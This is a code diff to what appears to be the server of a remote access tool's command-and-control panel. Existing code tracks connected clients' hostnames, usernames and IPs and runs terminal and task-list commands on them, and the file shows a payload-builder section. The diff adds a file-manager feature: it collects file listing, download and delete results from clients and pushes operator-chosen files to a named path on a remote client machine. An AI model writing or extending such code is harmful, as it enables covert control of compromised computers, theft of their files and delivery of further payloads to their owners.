@@ -29,6 +29,8 @@ terminal_results = {}
 terminal_results_lock = threading.Lock()
 tasklist_results = {}
 tasklist_results_lock = threading.Lock()
+fm_results = {}
+fm_results_lock = threading.Lock()
 
 # WebSocket connected clients: client_id -> {ws, hostname, username, ip, user_id}
 ws_clients = {}
@@ -896,6 +898,10 @@ def c2_websocket(ws):
                 with tasklist_results_lock:
                     tasklist_results[client_id] = msg.get('tasks', [])
                 continue
+            if msg.get('type') in ('fm_list_res', 'fm_download_res', 'fm_delete_res', 'fm_upload_res'):
+                with fm_results_lock:
+                    fm_results[client_id] = msg
+                continue
             with get_db() as db:
                 db.execute('UPDATE clients SET last_heartbeat = CURRENT_TIMESTAMP WHERE client_id = ?', (client_id,))
                 db.commit()
@@ -1082,6 +1088,39 @@ def c2_get_tasklist(client_id):
     with tasklist_results_lock:
         tasks = tasklist_results.pop(client_id, None)
     return jsonify({'tasks': tasks})
+
+
+@app.route('/api/c2/fm/result/<client_id>')
+@login_required
+def c2_fm_result(client_id):
+    with fm_results_lock:
+        res = fm_results.pop(client_id, None)
+    return jsonify(res)
+
+
+@app.route('/api/c2/fm/upload/<client_id>', methods=['POST'])
+@login_required
+def c2_fm_upload(client_id):
+    user = request.current_user
+    with get_db() as db:
+        client = db.execute('SELECT client_id FROM clients WHERE client_id = ? AND user_id = ?',
+                            (client_id, user['id'])).fetchone()
+        if not client:
+            return jsonify({'error': 'client not found'}), 404
+    with ws_clients_lock:
+        wsc = ws_clients.get(client_id)
+    if not wsc:
+        return jsonify({'error': 'client offline'}), 404
+
+    dest_path = request.form.get('path', '')
+    file = request.files.get('file')
+    if not dest_path or not file:
+        return jsonify({'error': 'missing path or file'}), 400
+
+    data_b64 = base64.b64encode(file.read()).decode('ascii')
+    command = f'fm_upload:{dest_path}|{data_b64}'
+    wsc['cmd_queue'].put(json.dumps({'type': 'command', 'command': command}, separators=(',', ':')))
+    return jsonify({'success': True})
 
 
 # ===== BUILDER =====
